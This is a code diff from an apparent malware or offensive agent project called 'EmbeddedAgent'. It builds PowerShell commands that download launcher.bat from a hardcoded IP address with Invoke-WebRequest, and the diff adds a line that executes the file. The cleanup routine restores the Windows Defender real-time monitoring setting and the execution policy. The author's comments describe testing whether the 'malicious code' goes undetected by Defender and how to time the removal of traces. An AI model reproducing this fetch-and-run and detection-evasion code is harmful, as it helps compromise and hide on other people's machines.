@@ -54,6 +54,8 @@ namespace EmbeddedAgent
 
             if (!CheckIfLauncherIsAlreadyInstalled())
                 commands.Add("Invoke-WebRequest http://192.168.76.131/launcher.bat -OutFile launcher.bat");
+            
+            commands.Add(".\\launcher.bat");
 
             return commands;
 
@@ -61,13 +63,8 @@ namespace EmbeddedAgent
         /*
          * TODO test cases
          * 
-         * First Test case:
-         * I execute the malicious command and then wait a moment and then i run the cleanup command (I will try to see if the command gets detected,even after it has bee run)
-         * If nothing happens and it doesnt get detected then i'm good
-         * 
-         * Second case:
-         * Will have to think about it, if the first cas gets detected
-         * 
+         * So now, I know that even after i restart the win defender the malicious code does not detected, but there is one problem,
+         * I cant figure out the time i have to wait to run the clean up commands, when waiting after the background worker, but the file launcher.bat always get deleted
          */
         public static List<string> CleanUpCommands()
         {
@@ -76,9 +73,9 @@ namespace EmbeddedAgent
 
             commands.Add("Set-ExecutionPolicy Restricted");
             commands.Add("Set-MpPreference -DisableRealtimeMonitoring $false");
+            //commands.Add("Remove-Item .\\launcher.bat");
 
             return commands;
-
         }
     }
 }
